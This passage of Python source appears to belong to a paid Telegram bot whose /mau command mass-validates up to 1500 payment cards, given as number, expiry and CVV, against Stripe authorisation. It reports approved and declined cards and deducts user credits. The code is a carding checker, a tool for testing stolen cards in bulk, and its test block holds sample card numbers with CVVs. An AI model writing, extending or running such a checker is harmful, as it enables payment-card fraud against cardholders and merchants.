                    except Exception as e:
                        logger.error(f"Error sending approved result to user {user_info.get('id')}: {str(e)}")
                elif status_category == "declined":
                    stats["declined"] += 1
                else:
                    stats["error"] += 1
            
            # Update progress message after each batch (every 5 cards)
            await update_progress_message(context, update, stats, session_id)
            
    except asyncio.CancelledError:
        # The entire process was cancelled
        logger.info(f"MAU mass check process was cancelled for user {user_id}")
        return
    except Exception as e:
        logger.error(f"Error in process_mass_check: {str(e)}", exc_info=True)
    
    # Check if process was stopped by user
    stopped = active_mass_checks.get(session_id, {}).get("stopped", False) or stop_event.is_set()
    
    # Calculate elapsed time
    elapsed_time = round(time.time() - start_time, 2)
    logger.info(f"MAU mass check completed for user {user_id} in {elapsed_time}s")
    
    # Get user credits to check if unlimited
    user_credits = get_user_credits(user_id)
    is_unlimited = user_credits == float('inf')
    
    # Deduct only 1 credit for successful mass check (only if not stopped)
    if not is_unlimited and not stopped:
        update_user_credits(user_id, -1)
        logger.info(f"Deducted 1 credit from user {user_id}")
    
    # Send final stats message with requested format
    try:
        if stopped:
            # Use format_stopped_response which doesn't include stop button
            final_msg = format_stopped_response(stats, elapsed_time, first_name, session_id)
        else:
            # Use format_final_response for normal completion
            final_msg = format_final_response(stats, elapsed_time, first_name, stopped, session_id)
        
        await safe_edit_message_text(
            context,
            update.effective_chat.id,
            active_mass_checks[session_id]["message_id"],
            final_msg
        )
    except Exception as e:
        logger.error(f"Error sending mau final message: {str(e)}")
    
    # Clean up stop flag
    if session_id in active_mass_checks:
        del active_mass_checks[session_id]
    
    logger.info(f"MAU mass check process cleaned up for user {user_id}")

async def handle_stop_command(update: Update, context: CallbackContext):
    """
    Handle /stop command with session ID to stop mass check.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    
    # Extract session ID from command arguments
    if not context.args:
        # List all active sessions for this user
        user_sessions = [session_id for session_id, data in active_mass_checks.items() if data["user_id"] == user_id]
        
        if not user_sessions:
            await update.message.reply_text(
                "⚠️ <b>No active mass check sessions found.</b>\n\n"
                "<i>Start a mass check with /mau command first.</i>",
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return
        
        session_list = "\n".join([f"• <code>{session_id}</code>" for session_id in user_sessions])
        await update.message.reply_text(
            f"📋 <b>Your active mass check sessions:</b>\n\n"
            f"{session_list}\n\n"
            f"<i>Use /stop &lt;session_id&gt; to stop a specific session.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    session_id = context.args[0].upper()
    
    # Check if there's an active mass check for this session ID
    if session_id not in active_mass_checks:
        await update.message.reply_text(
            f"⚠️ <b>No active mass check session found with ID:</b> <code>{session_id}</code>\n\n"
            "<i>Check session ID and try again.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Check if user who sent command is same as one who initiated check
    if active_mass_checks[session_id]["user_id"] != user_id:
        await update.message.reply_text(
            "⛔ <b>Access denied!</b>\n\n"
            "<i>You can only stop your own mass check sessions.</i>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return
    
    # Set stop flag and event for this session - IMMEDIATE STOP
    active_mass_checks[session_id]["stopped"] = True
    stop_event = active_mass_checks[session_id].get("stop_event")
    if stop_event:
        stop_event.set()
    
    logger.info(f"MAU stop requested by user {user_id} for session {session_id}")
    
    # Calculate elapsed time
    start_time = active_mass_checks[session_id].get("start_time", time.time())
    elapsed_time = round(abs(time.time() - start_time), 2)
    
    # Get stats from active_mass_checks
    stats = active_mass_checks[session_id].get("stats", {
        "total": 0,
        "checked": 0,
        "approved": 0,
        "declined": 0,
        "error": 0
    })
    
    # Get chat_id and message_id
    chat_id = active_mass_checks[session_id].get("chat_id")
    message_id = active_mass_checks[session_id].get("message_id")
    
    # Update progress message to show "Stopped" without stop button
    if chat_id and message_id:
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=format_stopped_response(stats, elapsed_time, first_name, session_id),
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as e:
            # If we get a "Message is not modified" error, try to send a new message
            if "Message is not modified" in str(e):
                try:
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=format_stopped_response(stats, elapsed_time, first_name, session_id),
                        parse_mode="HTML",
                        disable_web_page_preview=True
                    )
                except Exception as e2:
                    logger.error(f"Error sending MAU stop message: {str(e2)}")
            else:
                logger.error(f"Error updating MAU stop message: {str(e)}")
    
    # Send confirmation message to user
    await update.message.reply_text(
        f"✅ <b>Mass check session stopped successfully!</b>\n\n"
        f"<b>Session ID:</b> <code>{session_id}</code>\n"
        f"<b>Cards checked:</b> <code>{stats['checked']}/{stats['total']}</code>\n"
        f"<b>Time elapsed:</b> <code>{elapsed_time}s</code>",
        parse_mode="HTML",
        disable_web_page_preview=True
    )
    
    # NOTE: DO NOT DELETE from active_mass_checks HERE.
    # The main process_mass_check function will handle cleanup after its tasks are fully cancelled.
    # This prevents KeyError race condition.

async def handle_mau_command(update, context):
    """
    Handle /mau command for mass checking Stripe Auth cards.
    
    Args:
        update: Telegram update object
        context: Telegram context object
    """
    # Get user info
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    logger.info(f"MAU mass Stripe Auth check command received from user {user_id} ({first_name})")
    
    # Get user tier from plans module
    user_tier = get_user_current_tier(user_id)
    
    # Check if user has an active plan (not trial)
    if user_tier == "Trial":
        await update.message.reply_text(
            f"⚠️ <b>Access Denied!</b>\n\n"
            f"<i>This feature is not available for trial users.</i>\n\n"
            f"<b>Current Plan:</b> <code>{user_tier}</code>\n"
            f"<b>Upgrade to access this feature.</b>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        logger.info(f"MAU mass check denied for trial user {user_id}")
        return
    
    # Get user credits
    user_credits = get_user_credits(user_id)
    
    # Check if user has enough credits (or unlimited)
    is_unlimited = user_credits == float('inf')
    has_credits = user_credits is not None and (is_unlimited or user_credits > 0)
    
    # Check if user provided cards or a file
    cards = []
    
    # Check if a document was provided
    if update.message.document and update.message.document.mime_type == "text/plain":
        # Download the file
        file = await context.bot.get_file(update.message.document.file_id)
        file_content = await file.download_as_bytearray()
        
        # Try different encodings to handle various file formats
        text = None
        for encoding in ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']:
            try:
                text = file_content.decode(encoding)
                logger.info(f"Successfully decoded file with {encoding} encoding for user {user_id}")
                break
            except UnicodeDecodeError:
                continue
        
        if not text:
            # If all encodings fail, try with error handling
            try:
                text = file_content.decode('utf-8', errors='replace')
                logger.warning(f"Decoded file with UTF-8 and error handling for user {user_id}")
            except Exception as e:
                logger.error(f"Failed to decode file for user {user_id}: {str(e)}")
                await safe_send_message(
                    context,
                    update.effective_chat.id,
                    "⚠️ <b>Failed to read file!</b>\n\n"
                    "<i>The file could not be decoded. Please ensure it's a valid text file.</i>"
                )
                return
        
        # Extract cards from text
        cards = extract_cards_from_text(text)
        logger.info(f"Loaded {len(cards)} cards from file for mau user {user_id}")
    # Check if cards were provided as text (after command)
    elif context.args:
        # Get the message text directly to preserve newlines
        message_text = update.message.text
        
        # Remove command and any leading/trailing whitespace
        if message_text.startswith('/mau'):
            message_text = message_text[4:].strip()
        
        # Extract cards from text
        cards = extract_cards_from_text(message_text)
        logger.info(f"Loaded {len(cards)} cards from message for mau user {user_id}")
    # Check if there's a reply to a message with cards
    elif update.message.reply_to_message:
        # Check if replied message has text
        if update.message.reply_to_message.text:
            # Get the text from replied message
            reply_text = update.message.reply_to_message.text
            cards = extract_cards_from_text(reply_text)
            logger.info(f"Loaded {len(cards)} cards from reply for mau user {user_id}")
        # Check if replied message has a document
        elif update.message.reply_to_message.document and update.message.reply_to_message.document.mime_type == "text/plain":
            # Download the file
            file = await context.bot.get_file(update.message.reply_to_message.document.file_id)
            file_content = await file.download_as_bytearray()
            
            # Try different encodings to handle various file formats
            text = None
            for encoding in ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']:
                try:
                    text = file_content.decode(encoding)
                    logger.info(f"Successfully decoded replied file with {encoding} encoding for user {user_id}")
                    break
                except UnicodeDecodeError:
                    continue
            
            if not text:
                # If all encodings fail, try with error handling
                try:
                    text = file_content.decode('utf-8', errors='replace')
                    logger.warning(f"Decoded replied file with UTF-8 and error handling for user {user_id}")
                except Exception as e:
                    logger.error(f"Failed to decode replied file for user {user_id}: {str(e)}")
                    await safe_send_message(
                        context,
                        update.effective_chat.id,
                        "⚠️ <b>Failed to read file!</b>\n\n"
                        "<i>The file could not be decoded. Please ensure it's a valid text file.</i>"
                    )
                    return
            
            # Extract cards from text
            cards = extract_cards_from_text(text)
            logger.info(f"Loaded {len(cards)} cards from replied file for mau user {user_id}")
    
    # Validate that we have cards
    if not cards:
        await safe_send_message(
            context,
            update.effective_chat.id,
            "⚠️ <b>No cards provided!</b>\n\n"
            "<i>Usage: /mau followed by cards in separate lines, upload a .txt file with cards, or reply to a message containing cards</i>"
        )
        logger.info(f"MAU mass check denied for user {user_id} - no cards provided")
        return
    
    # Check if number of cards exceeds limit
    if len(cards) > 1500:
        await safe_send_message(
            context,
            update.effective_chat.id,
            f"⚠️ <b>Too many cards provided!</b>\n\n"
            f"<i>Maximum allowed is 1500 cards, but you provided {len(cards)}.</i>"
        )
        logger.info(f"MAU mass check denied for user {user_id} - too many cards: {len(cards)}")
        return
    
    # Check if user has enough credits for all cards (only need 1 credit for successful mass check)
    if not is_unlimited and user_credits < 1:
        await safe_send_message(
            context,
            update.effective_chat.id,
            f"⚠️ <b>Not enough credits!</b>\n\n"
            f"<i>You need at least 1 credit to use mau mass checking.</i>"
        )
        logger.info(f"MAU mass check denied for user {user_id} - insufficient credits")
        return
    
    # Prepare user info
    user_info = {
        "id": user_id,
        "username": username,
        "first_name": first_name
    }
    
    # Create a background task to process mass check
    logger.info(f"Starting mau mass Stripe Auth check task for user {user_id}")
    asyncio.create_task(process_mass_check(cards, user_info, update, context))

if __name__ == "__main__":
    # For testing purposes
    test_cards = [
        "5108050299485784|07|28|965",
        "4889450004111111|03|25|737"
    ]
    test_user = {
        "id": 123456789,
        "username": "testuser",
        "first_name": "Test"
    }
    
    async def test():
        for card in test_cards:
            result = await check_card(card, test_user)
            formatted, _ = format_response_stripe_auth(result, test_user)
            print(formatted)
    
    asyncio.run(test())
